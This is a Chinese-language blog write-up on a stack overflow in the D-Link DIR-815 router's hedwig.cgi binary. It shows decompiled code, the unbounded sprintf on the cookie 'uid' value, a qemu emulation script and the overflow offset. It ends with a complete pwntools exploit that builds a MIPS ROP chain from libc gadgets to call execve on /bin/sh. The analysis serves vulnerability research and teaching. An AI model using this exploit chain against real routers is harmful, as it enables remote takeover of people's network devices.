---
title: D-LINK-DIR815_stack_overflow
date: 2020-12-19 14:09:36
tags:
---

# D-LINK-DIR815栈溢出分析

## 前言

D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。

## 漏洞分析

下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。

main函数根据启动时的参数确定，形如`./cgibin /hedwig.cgi`的启动方式对应进入hedwigcgi_main的处理逻辑。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // $s0
  char *v6; // $v0
  int (*v8)(); // $t9
  int v9; // $a0

  v3 = *argv;
  v6 = strrchr(*argv, 47);
  if ( v6 )
    v3 = v6 + 1;
  if ( !strcmp(v3, "phpcgi") )
  {
    v8 = phpcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(int, const char **, const char **))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "dlcfg.cgi") )
  {
    v8 = dlcfg_main;
    v9 = argc;
    return ((int (__fastcall *)(int, const char **, const char **))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "seama.cgi") )
  {
    v8 = seamacgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "fwup.cgi") )
  {
    v8 = fwup_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "fwupdater") )
  {
    v8 = (int (*)())fwupdater_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "session.cgi") )
  {
    v8 = (int (*)())&sessioncgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "captcha.cgi") )
  {
    v8 = (int (*)())&captchacgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "hedwig.cgi") )
  {
    v8 = hedwigcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "pigwidgeon.cgi") )
  {
    v8 = (int (*)())&pigwidgeoncgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "service.cgi") )
  {
    v8 = (int (*)())&servicecgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "ssdpcgi") )
  {
    v8 = ssdpcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "soap.cgi") )
  {
    v8 = soapcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "gena.cgi") )
  {
    v8 = genacgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "conntrack.cgi") )
  {
    v8 = (int (*)())&conntrackcgi_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  if ( !strcmp(v3, "hnap") )
  {
    v8 = (int (*)())&hnap_main;
    v9 = argc;
    return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);
  }
  printf("CGI.BIN, unknown command %s\n", v3);
  return 1;
}
```

hedwigcgi_main是漏洞存在的函数，其获取数据的方式基本都是通过getenv从环境变量中获取，比如`REQUEST_METHOD`这个字段，这点和我们之前遇到的httpd通过http请求不同。

继续往下看，需要校验`REQUEST_METHOD=POST`，通过sess_get_uid函数获取环境变量中的uid保存到v6，在sess_get_uid函数中需要给出`HTTP_COOKIE`和`REMOTE_ADDR`，所有通过环境变量获取的字符串会通过`sobj_add_string`拼接起来返回给上层函数.


sprintf不会限制拷贝的字节数，输入过长的uid造成栈溢出。之后需要创建一个`/var/tmp/temp.xml`文件且赋予可写权限，在下面还有一个sprintf存在溢出，这里我们只拿第一个做利用。


```c
int hedwigcgi_main()
{
  char *v0; // $v0
  const char *v1; // $a1
  FILE *v2; // $s0
  int v3; // $fp
  int v4; // $s5
  int v5; // $v0
  const char *v6; // $v0
  FILE *v7; // $s2
  int v8; // $v0
  int v9; // $s7
  int v10; // $v0
  char **v11; // $s1
  int i; // $s3
  char *v13; // $v0
  const char **v14; // $s1
  int v15; // $s0
  char *v16; // $v0
  const char **v17; // $s1
  int v18; // $s0
  int v19; // $v0
  const char *v20; // $v0
  char v22[20]; // [sp-4D0h] [-4D0h] BYREF
  char *v23; // [sp-4BCh] [-4BCh] BYREF
  char *v24; // [sp-4B8h] [-4B8h]
  _DWORD v25[3]; // [sp-4B4h] [-4B4h] BYREF
  char v26[128]; // [sp-4A8h] [-4A8h] BYREF
  char v27[1064]; // [sp-428h] [-428h] BYREF

  memset(v27, 0, 0x400u);
  memset(v26, 0, sizeof(v26));
  strcpy(v22, "/runtime/session");
  v0 = getenv("REQUEST_METHOD");
  if ( !v0 )
  {
    v1 = "no REQUEST";
LABEL_7:
    v3 = 0;
    v4 = 0;
LABEL_34:
    v9 = -1;
    goto LABEL_25;
  }
  if ( strcasecmp(v0, "POST") )
  {
    v1 = "unsupported HTTP request";
    goto LABEL_7;
  }
  cgibin_parse_request(sub_409A6C, 0, 0x20000);
  v2 = fopen("/etc/config/image_sign", "r");
  if ( !fgets(v26, 128, v2) )
  {
    v1 = "unable to read signature!";
    goto LABEL_7;
  }
  fclose(v2);
  cgibin_reatwhite(v26);
  v4 = sobj_new();
  v5 = sobj_new();
  v3 = v5;
  if ( !v4 || !v5 )
  {
    v1 = "unable to allocate string object";
    goto LABEL_34;
  }
  sess_get_uid(v4);
  v6 = (const char *)sobj_get_string(v4);
  sprintf(v27, "%s/%s/postxml", "/runtime/session", v6);
  xmldbc_del(0, 0, v27);
  v7 = fopen("/var/tmp/temp.xml", "w");
  if ( !v7 )
  {
    v1 = "unable to open temp file.";
    goto LABEL_34;
  }
  if ( !haystack )
  {
    v1 = "no xml data.";
    goto LABEL_34;
  }
  v8 = fileno(v7);
  v9 = lockf(v8, 3, 0);
  if ( v9 < 0 )
  {
    printf(
      "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n<hedwig><result>BUSY</result><message>%s</message></hedwig>",
      0);
    v9 = 0;
    goto LABEL_26;
  }
  v10 = fileno(v7);
  lockf(v10, 1, 0);
  v23 = v26;
  v24 = 0;
  v25[0] = 0;
  v25[1] = 0;
  v25[2] = 0;
  v24 = strtok(v22, "/");
  v11 = (char **)v25;
  for ( i = 2; ; ++i )
  {
    v13 = strtok(0, "/");
    *v11++ = v13;
    if ( !v13 )
      break;
  }
  (&v23)[i] = (char *)sobj_get_string(v4);
  fputs("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n", v7);
  v14 = (const char **)&v23;
  v15 = 0;
  do
  {
    ++v15;
    fprintf(v7, "<%s>\n", *v14++);
  }
  while ( v15 < i + 1 );
  v16 = strstr(haystack, "<postxml>");
  fprintf(v7, "%s\n", v16);
  v17 = (const char **)&(&v23)[i];
  v18 = i + 1;
  do
  {
    --v18;
    fprintf(v7, "</%s>\n", *v17--);
  }
  while ( v18 > 0 );
  fflush(v7);
  xmldbc_read(0, 2, "/var/tmp/temp.xml");
  v19 = fileno(v7);
  lockf(v19, 0, 0);
  fclose(v7);
  remove("/var/tmp/temp.xml");
  v20 = (const char *)sobj_get_string(v4);
  sprintf(v27, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", "/runtime/session", v20);
  xmldbc_ephp(0, 0, v27, stdout);
  if ( v9 )
  {
    v1 = 0;
LABEL_25:
    printf(
      "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n<hedwig><result>FAILED</result><message>%s</message></hedwig>",
      v1);
  }
LABEL_26:
  if ( haystack )
    free(haystack);
  if ( v3 )
    sobj_del(v3);
  if ( v4 )
    sobj_del(v4);
  return v9;
}
```

```c
int __fastcall sess_get_uid(int a1)
{
  int v2; // $s2
  char *v3; // $v0
  int v4; // $s3
  char *v5; // $s4
  int v6; // $s1
  int v7; // $s0
  char *v8; // $v0
  int result; // $v0

  v2 = sobj_new();
  v4 = sobj_new();
  v3 = getenv("HTTP_COOKIE");
  if ( !v2 )
    goto LABEL_27;
  if ( !v4 )
    goto LABEL_27;
  v5 = v3;
  if ( !v3 )
    goto LABEL_27;
  v6 = 0;
  while ( 1 )
  {
    v7 = *v5;
    if ( !*v5 )
      break;
    if ( v6 == 1 )
      goto LABEL_11;
    if ( v6 < 2 )
    {
      if ( v7 == 32 )
        goto LABEL_18;
      sobj_free(v2);
      sobj_free(v4);
LABEL_11:
      if ( v7 == 59 )
      {
        v6 = 0;
      }
      else
      {
        v6 = 2;
        if ( v7 != 61 )
        {
          sobj_add_char(v2, v7);
          v6 = 1;
        }
      }
      goto LABEL_18;
    }
    if ( v6 == 2 )
    {
      if ( v7 == 59 )
      {
        v6 = 3;
        goto LABEL_18;
      }
      sobj_add_char(v4, *v5++);
    }
    else
    {
      v6 = 0;
      if ( !sobj_strcmp(v2, "uid") )
        goto LABEL_21;
LABEL_18:
      ++v5;
    }
  }
  if ( !sobj_strcmp(v2, "uid") )
  {
LABEL_21:
    v8 = sobj_get_string(v4);
    goto LABEL_22;
  }
LABEL_27:
  v8 = getenv("REMOTE_ADDR");
LABEL_22:
  result = sobj_add_string(a1, v8);
  if ( v2 )
    result = sobj_del(v2);
  if ( v4 )
    result = sobj_del(v4);
  return result;
}
```

## 漏洞利用

sprintf函数以零字节为截断符，cgibin的代码段地址为0x0040xxxx，高位必然存在零字节截断，因而无法通过代码段构造rop，这里模拟真机环境下的无地址随机化，使用用户态的qemu-mipsel-static启动固件。假如可以拿到真机，开放ssh服务，通过gdbserver+gdb即可调试真机，cgibin的固件地址可以通过gdb调试得到(系统关闭随机化)。

```bash
#/bin/bash
PORT="1234"
test=$(python -c "print 'uid='+open('test','r').read(2000)")
LEN=$(echo -n "$test" | wc -c)
sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null rm -f ./qemu
```

首先需要确定溢出的偏移，在gdb调试到sprintf时使用`cyclic 2000`生成payload，`set {char [2002]} 0x42e0d8 = ""`将目标地址的内容强制修改为cyclic字符串，最后使用`cyclic -l 61616c6b`确定偏移为1043.

![](./1.png)

观察函数退出时的汇编，可以控制s0-s7,fp和ra。

```asm
.text:00409A28                 lw      $ra, 0x4E4($sp)
.text:00409A2C                 move    $v0, $s7
.text:00409A30                 lw      $fp, 0x4E0($sp)
.text:00409A34                 lw      $s7, 0x4DC($sp)
.text:00409A38                 lw      $s6, 0x4D8($sp)
.text:00409A3C                 lw      $s5, 0x4D4($sp)
.text:00409A40                 lw      $s4, 0x4D0($sp)
.text:00409A44                 lw      $s3, 0x4CC($sp)
.text:00409A48                 lw      $s2, 0x4C8($sp)
.text:00409A4C                 lw      $s1, 0x4C4($sp)
.text:00409A50                 lw      $s0, 0x4C0($sp)
.text:00409A54                 jr      $ra
```

寻找可控参数寄存器`a0/a1/a2`的寄存器，找到`#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6`这样一个完美的gadget，由于system函数末尾为零字节，改为调用execve函数。system函数会启动一个新进程，保留旧进程；而execve函数拿bash进程替换原进程。

## exp.py

```py
#coding=utf-8
from pwn import *
context.arch = 'mips'
context.endian =  'little'
#0x0040dc14 : move $a0, $s3 ; jalr $t9 ; move $a1, $s0
mov_a0_s3 = 0x0040dc14
#0x00404d6c : move $t9, $v1 ; jalr $t9 ; move $a0, $s3
mov_t9_v1 = 0x00404d6c
#0x00402F84 :lw $a0, 0x4E4($sp) ; lw $t9, 0x4E0($sp) ; jalr    $t9 ;
#0x00046838 : move $t9, $s2 ; move $a0, $s1 ; move $a1, $s7 ; move $a2, $s6 ; move $t9, $s3 ; jalr $t9 ; move $a3, $s5
libc_base = 0x7f738000
magic = libc_base + 0x46838
#0x0003a738 : move $a1, $zero ; move $t9, $s0 ; jalr $t9 ; move $a2, $s2
magic2 = libc_base + 0x3a738
#0x00032198 : move $s0, $zero ; move $t9, $s7 ; jalr $t9 ; move $a0, $s4
magic3 = libc_base + 0x32198
#0x00028398 : move $a2, $s0 ; move $a1, $s1 ; move $t9, $s3 ; jalr $t9 ; move $a0, $s2
magic4 = libc_base + 0x28398
#0x00022760 : move $t9, $s1 ; move $a0, $s5 ; move $a1, $zero ; move $a2, $zero ; jalr $t9 ; move $a3, $s6
magic5 = libc_base + 0x00022760
system = 0x7f78b200-1
execv = 0x7f78d650
execve = 0x7f742e90
binsh = 0x7f792448

payload = b"xmzyshypnc"
payload = payload.ljust(1043-4*9,b'b')
#payload = bytes(payload,encoding="gb2312")
payload += p32(magic)  #s0
payload += p32(execve)  #s1
payload += b"aaaa"   #s2
payload += p32(magic2)   #s3
payload += b"aaaa"   #s4
payload += p32(binsh)   #s5
payload += b"a2a2"   #s6
payload += b"a1a1"   #s7
payload += p32(magic4)    #fp
payload += p32(magic5)

with open('test','wb') as f:
    f.write(payload)
```

![](./2.png)
